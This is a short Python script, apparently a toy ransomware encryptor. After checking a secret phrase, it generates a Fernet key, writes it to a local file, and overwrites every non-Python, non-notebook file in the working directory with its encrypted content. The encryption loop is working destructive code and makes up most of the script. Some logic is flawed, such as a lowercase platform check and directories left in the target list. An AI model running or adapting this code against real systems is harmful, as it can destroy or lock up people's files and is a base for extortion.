import time as ti
import platform as pt
import sys as s
import os as o
import subprocess as sb
from cryptography.fernet import Fernet as frn

# Static and Secret Variables
FILE = 'thekey.key'
SECRET_P = o.getenv("SECRET_P")
MLS = ('.py' , '.ipynb')
LIS =  [f for f in o.listdir() if o.path.isfile(f) and (f.endswith(MLS) or f == FILE)]
FLIS = [f for f in o.listdir() if f not in LIS]
MODE = 'wb'
SYM = '-'*50

if not SECRET_P:
    print("You Dont have the necessary permission here\nPlease add one Secret Phrase ")
    ti.sleep(1)
    o.system('cls' if  pt.system() == 'windows' else 'clear')
    s.exit()

if not LIS:
    print("Python Found out that there is no non pythonic or jupyter file in the directory \nPlease populate the same\n")
    ti.sleep(1)
    o.system('cls' if  pt.system() == 'windows' else 'clear')
    s.exit()

# Introducing the Program
run = sb.run(
    ['python3','into_file.py'],
    capture_output = True,
    text = True,
    check = True
)

print(f"{SYM}\n{run.stdout}")

# Generating the Fernet Key and writing to a file
key = frn.generate_key()

with open(FILE , MODE) as k:
    k.write(key)

print("The Key has been saved ......")

ph = input("Enter your Secret Phase : ").strip().lower()

if ph == SECRET_P:
    print("Authenticated as User\nProceeding ....")
    ti.sleep(1)
    for fil in FLIS:
        with open(fil , 'rb') as fl:
            con = fl.read()
        dec_con = frn(key).encrypt(con)
        with open(fil , 'wb') as wl:
            wl.write(dec_con)

    print("D*N3----\nThe Encryption Process Worked")
else:
    print("Not the Intended person\nOr Maybe Try again and nope I'm not gonna help you")
    ti.sleep(1)
    o.system('cls' if  pt.system() == 'windows' else 'clear')
    s.exit()